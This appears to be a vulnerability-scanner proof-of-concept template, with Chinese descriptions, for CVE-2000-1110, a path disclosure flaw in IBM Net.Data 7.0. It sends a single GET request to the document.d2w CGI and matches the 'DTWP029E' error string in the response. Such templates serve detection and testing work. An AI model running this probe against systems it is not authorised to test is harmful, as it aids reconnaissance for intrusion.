[info]
author = "AVE"
description = "向 IBM Net.Data 7.0 的 /cgi-bin/db2www/library/document.d2w CGI 发送包含不存在命令的 HTTP GET 请求，若响应中包含 'DTWP029E' 错误信息及服务器物理路径，则表明目标存在路径泄露漏洞。"
id = "POC-AVE-2000-0801"
name = "IBM Net.Data 7.0 document.d2w 完整路径泄露 PoC"
severity = "medium"
tags = ["ave-2000-0801"]
vuln_id = [
    "CVE-2000-1110",
    "AVE-2000-0801",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/db2www/library/document.d2w/show"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["DTWP029E"]
